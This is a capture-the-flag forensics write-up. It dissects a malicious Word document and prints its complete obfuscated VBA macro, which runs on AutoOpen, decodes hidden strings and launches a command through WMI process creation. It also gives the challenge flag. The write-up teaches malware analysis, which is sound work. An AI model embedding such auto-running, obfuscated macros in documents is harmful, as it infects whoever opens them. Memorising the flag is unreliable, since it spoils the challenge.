# ✅ FORENSICS - Tragedy Redux

Writeup by: [@goproslowyo](https://github.com/goproslowyo)

## Tags

- easy

Files:

- [tragedy_redux.7z](./tragedy_redux.7z)

## Description

Author: @JohnHammond

We found this file as part of an attack chain that seemed to manipulate file contents  to stage a payload. Can you make any sense of it? Archive password: `infected`. Download the file(s) below.

## Writeup

Inspecting the file show's it's a "zip" archive. Yea, it's just a Word document but Word documents are just zip files for all intents and purposes:

```shell
$ file tragedy_redux
tragedy_redux: Zip archive data, made by v4.5, extract using at least v2.0, last modified, last modified Sun, Jan 01 1980 00:00:00, uncompressed size 1453, method=deflate
```

So let's unzip it:

```shell
$ unzip -d extracted tragedy_redux
Archive:  tragedy_redux
file #1:  bad zipfile offset (local header sig):  0
  inflating: extracted/_rels/.rels
  inflating: extracted/word/document.xml
  inflating: extracted/word/_rels/document.xml.rels
  inflating: extracted/word/vbaProject.bin
  inflating: extracted/word/theme/theme1.xml
  inflating: extracted/word/_rels/vbaProject.bin.rels
  inflating: extracted/word/vbaData.xml
  inflating: extracted/word/settings.xml
  inflating: extracted/word/styles.xml
  inflating: extracted/word/webSettings.xml
  inflating: extracted/word/fontTable.xml
  inflating: extracted/docProps/core.xml
  inflating: extracted/docProps/app.xml
```

Looking over the files extracted the most interesting to us is the VBScript located in `extracted/word/vbaProject.bin` that's including in the Word document.

To look into the file we can use [oledump.py from Didier Stevens](https://blog.didierstevens.com/programs/oledump-py/). This will allow us to analyze this OLE file.

```shell
$ ./oledump.py vbaProject.bin
  1:       410 'PROJECT'
  2:        71 'PROJECTwm'
  3: M    6164 'VBA/NewMacros'
  4: m     954 'VBA/ThisDocument'
  5:      3067 'VBA/_VBA_PROJECT'
  6:      3003 'VBA/__SRP_0'
  7:       226 'VBA/__SRP_1'
  8:      2334 'VBA/__SRP_2'
  9:       526 'VBA/__SRP_3'
 10:       571 'VBA/dir'
```

Here we can see that stream ID 3 has a large 6164 byte VB Macro embedded... Seems interesting. Let's extract it:

```shell
$ oledump.py -s 3 -v vbaProject.bin

Attribute VB_Name = "NewMacros"
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    OatMilk = OatMilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = OatMilk
End Function


Function Bears(Cows)
    Bears = StrReverse(Cows)
End Function

Function Tragedy()

    Dim Apples As String
    Dim Water As String

    If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
        Exit Function
    End If

    Apples = "129128136118131132121118125125049062118127116049091088107132106104116074090126107132106104117072095123095124106067094069094126094139094085086070095139116067096088106065107085098066096088099121094101091126095123086069106126095074090120078078"
    Water = Nuts(Apples)


    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin

End Function

Sub AutoOpen()
    Tragedy
End Sub
```

Well, well, well. Look what we have here. An obfuscated VBScript/Macro it seems.

```vbscript
Attribute VB_Name = "NewMacros"

Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    OatMilk = OatMilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = OatMilk
End Function


Function Bears(Cows)
    Bears = StrReverse(Cows)
End Function

Function Tragedy()
    Dim Apples As String
    Dim Water As String

    If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
        Exit Function
    End If

    Apples = "129128136118131132121118125125049062118127116049091088107132106104116074090126107132106104117072095123095124106067094069094126094139094085086070095139116067096088106065107085098066096088099121094101091126095123086069106126095074090120078078"
    Water = Nuts(Apples)

    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Function

Sub AutoOpen()
    Tragedy
End Sub
```

There's a lot going on here but there's a few interesting things we can notice:

1. Upon the Word document opening the function `Tragedy` is called.

```vbscript
Sub AutoOpen()
    Tragedy
End Sub
```

1. Tragedy sets up a string called `Apples` and passes it to a function called `Nuts()`.

```vbscript
Function Tragedy()
[...]
    Apples = "129128136118131132121118125125049062118127116049091088107132106104116074090126107132106104117072095123095124106067094069094126094139094085086070095139116067096088106065107085098066096088099121094101091126095123086069106126095074090120078078"
    Water = Nuts(Apples)
[...]
End Function
```

1. The `Nuts()` function enters a loop while the `Len(Milk) > 0` and passes the input `Milk` along to a set of nested function calls to `Strawberries()` and that output is then passed to `Pears()` setting the result to `OatMilk`. Milk is also passed along to a function called `Almonds()` on each iteration and the result of this function call is set to the value `Milk`. When the function exits, it returns the value of `OatMilk`.

```vbscript
Function Nuts(Milk)
    Do
    OatMilk = OatMilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = OatMilk
End Function
```

1. Following the programs logic flow, let's look at the `Strawberries(Milk)` call. The `Strawberries()` function takes a single argument, `Grapes`, and returns _the 3 leftmost characters_ of the `Grapes` input string. So, if you call Strawberries("My_Example_String"), it will return the first 3 characters of the input string, which are "My_".

```vbscript
Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function
```

1. Now let's step into the `Pear()` function and see how the input is being modified...

```vbscript
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function
```

---

... You know what?! Screw reversing this manually. Let's jump right into a tool that will do the work for us and and analyze the "malicious" code... Enter [ViperMonkey](https://github.com/decalage2/ViperMonkey)!

Pass the `vbaProject.bin` file as input to `ViperMonkey`:

```shell
$ docker run --rm -v $PWD:/work kirksayre/vipermonkey_pypy3 ViperMonkey/vipermonkey/vmonkey.py /work/extracted/word/vbaProject.bin
[... output in video below ...]
```

We can see some base64 in the `Parameters` column for the `Create` function in the `Recorded Actions` table. Decode the b64 to get your flag.

![ViperMonkey analyzing the VB Macro](./tragedy.webm)

`flag{63dcc82c30197768f4d458da12f618bc}`
